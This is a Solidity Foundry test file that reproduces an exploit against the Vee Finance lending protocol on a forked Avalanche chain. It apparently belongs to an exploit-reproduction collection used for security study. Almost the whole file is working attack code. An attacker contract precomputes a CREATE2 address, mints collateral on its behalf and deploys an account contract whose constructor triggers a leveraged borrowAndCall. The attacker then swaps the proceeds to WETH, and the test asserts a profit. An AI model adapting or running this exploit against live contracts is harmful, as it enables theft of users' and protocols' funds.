// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "../interface.sol";

interface IVeeCToken {
    function mintBehalf(
        address receiver,
        uint256 amount
    ) external returns (uint256);
    function borrowAndCall(
        uint256 borrowAmount,
        uint8 leverage,
        bytes4 signature,
        bytes calldata order
    ) external payable returns (bytes memory);
    function balanceOf(
        address account
    ) external view returns (uint256);
    function redeem(
        uint256 redeemTokens
    ) external returns (uint256);
    function repayBorrow(
        uint256 repayAmount
    ) external returns (uint256);
}

interface IVeeProxyController {
    function getAccountAssetBalance(
        address account,
        address token
    ) external view returns (uint256 accountBalance, uint256 leverageBalance);
}

interface IPangolinRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract VeeFinanceAccount {
    IERC20 private constant WETH = IERC20(0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB);
    IVeeCToken private constant C_WETH = IVeeCToken(0x024FDF9702C5ed031DeFEB380cA4D198435b305d);
    address private constant C_VEE = 0xdBE172e72044629aA5344A8d4F7b850E146a2890;

    uint256 private constant COLLATERAL = 962_462_752_229_458_474;
    uint256 private constant BORROW_AMOUNT = 519_729_886_203_907_576;
    uint8 private constant LEVERAGE = 3;

    constructor() payable {
        bytes memory createParams =
            abi.encode(address(C_WETH), C_VEE, BORROW_AMOUNT, 1_000_000 ether, 1, block.timestamp + 15 days, LEVERAGE);

        C_WETH.borrowAndCall{value: 0.05 ether}(
            BORROW_AMOUNT,
            LEVERAGE,
            bytes4(
                keccak256("createOrderERC20ToERC20(address,(address,address,uint256,uint256,uint256,uint256,uint8))")
            ),
            createParams
        );

        WETH.approve(address(C_WETH), type(uint256).max);
        require(C_WETH.repayBorrow(type(uint256).max) == 0, "repay failed");
        require(C_WETH.redeem(C_WETH.balanceOf(address(this))) == 0, "redeem failed");
        WETH.transfer(msg.sender, WETH.balanceOf(address(this)));
    }

    receive() external payable {}
}

contract VeeFinanceAttacker {
    IERC20 private constant WETH = IERC20(0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB);
    IERC20 private constant VEE = IERC20(0x8729438EB15e2C8B576fCc6AeCdA6A148776C0F5);
    IVeeCToken private constant C_WETH = IVeeCToken(0x024FDF9702C5ed031DeFEB380cA4D198435b305d);
    IVeeProxyController private constant VEE_PROXY = IVeeProxyController(0xd1F855ceF146D36CC5851E2139c54524420797f2);
    IPangolinRouter private constant PANGOLIN = IPangolinRouter(0xE54Ca86531e17Ef3616d22Ca28b0D458b6C89106);

    uint256 private constant COLLATERAL = 962_462_752_229_458_474;

    function exploit() external payable {
        uint256 balanceBefore = WETH.balanceOf(address(this));
        bytes32 salt = keccak256("Vee Finance constructor bypass");
        address account = _computeAccountAddress(salt);

        WETH.approve(address(C_WETH), type(uint256).max);
        require(C_WETH.mintBehalf(account, COLLATERAL) == 0, "mint failed");
        WETH.transfer(account, COLLATERAL);

        new VeeFinanceAccount{salt: salt, value: 0.05 ether}();

        (uint256 veeAmount,) = VEE_PROXY.getAccountAssetBalance(account, address(VEE));
        VEE.approve(address(PANGOLIN), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(VEE);
        path[1] = address(WETH);
        PANGOLIN.swapExactTokensForTokens(veeAmount, COLLATERAL, path, address(this), block.timestamp + 1);

        require(WETH.balanceOf(address(this)) > balanceBefore, "no profit");
    }

    function _computeAccountAddress(
        bytes32 salt
    ) private view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(type(VeeFinanceAccount).creationCode))
        );
        return address(uint160(uint256(hash)));
    }

    receive() external payable {}
}

contract VeeFinanceExploitTest is Test {
    IERC20 private constant WETH = IERC20(0x49D5c2BdFfac6CE2BFdB6640F4F80f226bc10bAB);

    function testExploit() public {
        vm.createSelectFork("https://api.avax.network/ext/bc/C/rpc", 4_622_794);

        VeeFinanceAttacker attacker = new VeeFinanceAttacker();
        deal(address(WETH), address(attacker), 2 ether);
        deal(0x8729438EB15e2C8B576fCc6AeCdA6A148776C0F5, address(attacker), 0.06 ether);
        vm.deal(address(attacker), 1 ether);

        uint256 balanceBefore = WETH.balanceOf(address(attacker));
        attacker.exploit();

        assertGt(WETH.balanceOf(address(attacker)), balanceBefore + 0.5 ether);
    }
}
